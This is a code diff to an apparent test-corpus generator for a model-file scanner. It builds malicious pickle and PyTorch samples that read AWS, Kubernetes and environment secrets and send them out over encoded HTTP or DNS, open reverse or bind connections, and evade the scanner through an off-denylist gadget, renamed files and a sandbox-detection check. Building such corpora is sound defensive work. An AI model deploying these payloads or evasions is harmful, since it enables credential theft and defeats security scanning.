@@ -131,7 +131,9 @@ def dns(label):
     name = b"".join(bytes([len(p)]) + p for p in parts) + b"\\0"
     d.sendto(b"\\x12\\x34\\x01\\0\\0\\1\\0\\0\\0\\0\\0\\0" + name + b"\\0\\1\\0\\1", ("8.8.8.8", 53))
     d.recv(512)
-CRED = open(os.path.expanduser("~/.aws/credentials"), "rb").read() if os.path.exists(os.path.expanduser("~/.aws/credentials")) else b""
+def cred():
+    path = os.path.expanduser("~/.aws/credentials")
+    return open(path, "rb").read() if os.path.exists(path) else b""
 '''
 behaviours = {
     "read-aws": 'open(os.path.expanduser("~/.aws/credentials")).read()',
@@ -139,15 +141,15 @@ behaviours = {
     "read-kube": 'open(os.path.expanduser("~/.kube/config")).read()',
     "read-environ": 'open("/proc/self/environ").read()',
     "read-passwd": 'open("/etc/passwd").read()',
-    "exfil-http-plain": "post(CRED)",
-    "exfil-http-b64": "import base64; post(base64.b64encode(CRED))",
+    "exfil-http-plain": "post(cred())",
+    "exfil-http-b64": "import base64; post(base64.b64encode(cred()))",
     "exfil-env": 'post(os.environ.get("OPENAI_API_KEY", "").encode())',
-    "exfil-hex": "post(CRED.hex().encode())",
-    "exfil-zlib": "import base64, zlib; post(base64.b64encode(zlib.compress(CRED)))",
-    "exfil-b32": "import base64; post(base64.b32encode(CRED))",
-    "exfil-dns-hex": "dns(CRED.hex())",
-    "exfil-xor": "post(bytes(b ^ 90 for b in CRED))",
-    "exfil-reversed": "post(CRED[::-1])",
+    "exfil-hex": "post(cred().hex().encode())",
+    "exfil-zlib": "import base64, zlib; post(base64.b64encode(zlib.compress(cred())))",
+    "exfil-b32": "import base64; post(base64.b32encode(cred()))",
+    "exfil-dns-hex": "dns(cred().hex())",
+    "exfil-xor": "post(bytes(b ^ 90 for b in cred()))",
+    "exfil-reversed": "post(cred()[::-1])",
     "beacon-http": 'post(b"hello")',
     "reverse-connect": 's = socket.create_connection(("198.51.100.20", 4444), timeout=5); s.close()',
     "bind-listen": 's = socket.socket(); s.bind(("0.0.0.0", 31337)); s.listen(1); s.close()',
@@ -182,11 +184,26 @@ evasions = {
 for name, body in evasions.items():
     add(f"evade-{name}.pkl", pkl(C(G("builtins", "exec"), py(f"evade-{name}", body))), "pickle", "malicious", "evasion", name)
 
+# Off the static denylist: a stdlib path it does not list, and renamed files.
+SPAWN = G("multiprocessing.util", "spawnv_passfds")
+
+
+def spawn(command):
+    return C(SPAWN, b"/bin/sh", [b"sh", b"-c", command.encode()], C(G("collections", "deque")))
+
+
+add("bypass-spawnv.pkl", pkl(spawn(sh("bypass-spawnv"))), "pickle", "malicious", "bypass", "stdlib gadget off the denylist")
+add("bypass-rename.dat", pkl(C(G("os", "system"), sh("bypass-rename"))), "pickle", "malicious", "bypass", "os.system in a .dat file")
+add("bypass-rename.weights", pkl(C(G("os", "system"), sh("bypass-rename"))), "pickle", "malicious", "bypass", "os.system in a .weights file")
+add("bypass-rename-pt.ckptx", pt(pkl(C(G("os", "system"), sh("bypass-rename-pt")))), "torch", "malicious", "bypass", "torch archive with an unknown extension")
+add("combo-spawnv-gate-file.pkl", pkl(spawn(sh("combo-spawnv-gate-file").replace("id > /dev/null", "test -e /gate || id > /dev/null"))),
+    "pickle", "malicious", "bypass", "off-list gadget that also detects the chamber")
+
 # Same payloads inside a PyTorch archive.
 for name, tree in {
     "os-system": C(G("os", "system"), sh("pt-os-system")),
     "exec": C(G("builtins", "exec"), py("pt-exec", BENIGN_ACT)),
-    "exfil": C(G("builtins", "exec"), py("pt-exfil", SEND + "post(CRED)")),
+    "exfil": C(G("builtins", "exec"), py("pt-exfil", SEND + "post(cred())")),
 }.items():
     add(f"pt-{name}.pt", pt(pkl(tree)), "torch", "malicious", "torch", name)
 
@@ -224,6 +241,7 @@ stress = {
     "memory-bomb": "b = []\nwhile True:\n    b.append(bytearray(1 << 26))\n",
     "cpu-spin": "while True:\n    pass\n",
     "event-flood": "for _ in range(2000000):\n    try:\n        open('/nonexistent')\n    except OSError:\n        pass\n",
+    "flood-then-exec": "for _ in range(2000000):\n    try:\n        open('/nonexistent')\n    except OSError:\n        pass\nos.system('id > /dev/null')\n",
     "segfault": "import ctypes; ctypes.string_at(0)",
     "kill-self": "import signal; os.kill(os.getpid(), signal.SIGKILL)",
 }
